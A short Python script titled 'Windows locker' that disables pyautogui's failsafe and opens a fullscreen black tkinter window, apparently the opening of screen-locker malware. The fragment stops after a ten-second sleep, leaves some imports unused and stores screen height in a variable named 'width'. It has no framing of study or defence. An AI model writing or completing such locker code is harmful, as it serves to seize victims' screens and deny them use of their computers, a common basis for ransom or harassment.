import pyautogui
from tkinter import Tk, Entry, Label
from pyautogui import click, moveTo
from time import sleep
root = Tk()
pyautogui.FAILSAFE = False
width = root.winfo_screenheight()
root.title("Windows locker")
root.attributes("-fullscreen", True)
root.configure(background='black')
root.update()
sleep(10)